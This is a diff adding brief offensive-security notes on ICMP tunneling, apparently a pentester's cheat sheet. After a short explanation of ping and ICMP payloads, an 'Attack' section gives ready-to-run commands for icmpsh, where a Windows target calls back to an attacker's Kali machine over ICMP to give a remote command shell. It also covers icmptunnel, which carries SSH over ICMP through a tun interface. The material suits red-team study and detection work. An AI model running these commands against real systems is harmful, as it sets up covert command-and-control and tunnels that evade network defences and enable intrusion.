@@ -1,0 +1,67 @@
+--------------------------
+ping	
+Ping is a control message that is a part of the ICMP (Internet Control Message Protocol).
+Ping is sent from one node in a network to another. It’s built from a layer 2 and layer 3 headers 
+(MAC and IP headers defined by the OSI module) and a special ICMP packet. 
+The sending node will set the destination parameters and if the message is received by the destination it will return it 
+right back 
+
+ICMP Tunneling
+ICMP Tunneling can be done by changing the Payload Data so it will contain the data we want to send.
+
+Tool: icmpsh
+It does not require administrative privileges. 
+C2-channel, slave runs on Windows (host) and master runs on Kali (attacker)
+
+--------------------------
+Attack:
+
+icmpsh	
+
+git clone https://github.com/inquisb/icmpsh.git 
+	
+# Master - Kali 
+sysctl -w net.ipv4.icmp_echo_ignore_all=1 
+cd icmpsh
+./icmpsh_m.py <attacker’s-IP> <target-IP> 
+	
+# Slave - Windows 
+icmpsh.exe -t <attacker’s-IP> 
+	
+# Master - Kali 
+./icmpsh_m.py <attacker’s-IP> <target-IP> 
+	
+# wireshark can be used to see commands run in the data
+
+--------------------------
+
+icmptunnel 	
+
+....Server side:
+git clone https://github.com/jamesbarlow/icmptunnel.git 
+cd icmptunnel
+make 
+	
+# ICMP echo reply disable. 
+echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all 
+	
+# ICMP tunnel run in server side and set IP to tun0 adaptor
+./icmptunnel -s
+Ctrlz
+bg
+/sbin/ifconfig tun0 10.0.0.1 netmask 255.255.255.0 ifconfig 
+	
+  
+.....Client side:
+git clone https://github.com/jamesbarlow/icmptunnel.git 
+cd icmptunnel
+make 
+	
+# ICMP echo reply disable. 
+echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all 
+./icmptunnel 192.168.1.108
+ctrl z
+/sbin/ifconfig tun0 10.0.0.2 netmask 255.255.255.0 
+	
+# connect to ssh using ICMP from server to client using tun interface
+ssh username@10.0.0.1 
